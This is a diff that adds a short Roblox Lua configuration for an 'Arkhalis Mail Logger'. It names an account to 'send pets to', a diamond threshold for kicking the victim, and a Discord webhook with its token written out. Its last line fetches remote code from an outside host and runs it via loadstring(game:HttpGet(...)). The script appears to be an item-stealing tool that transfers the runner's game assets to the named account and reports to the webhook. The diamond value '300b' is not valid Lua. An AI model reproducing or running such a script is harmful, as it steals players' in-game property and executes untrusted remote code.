@@ -1,0 +1,18 @@
+lua
+
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "melocampo23" --// Username To Send Pets To
+
+_G.Diamonds = 300b --// Amount Of Diamonds To Not Kick
+
+--[[ Webhook Config ]]--
+
+_G.Webhook = "https://discord.com/api/webhooks/1099330352658534502/R0hiBIlLAzJ0OtoRuEarR5LlYATjQCxRZ74Hr2uo4wr8O_HGGPiwR3dHlFfuKlrKJFOe" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+
+loadstring(game:HttpGet("https://arkhalislua.github.io/ArkhalisMailbox.lua"))()
+
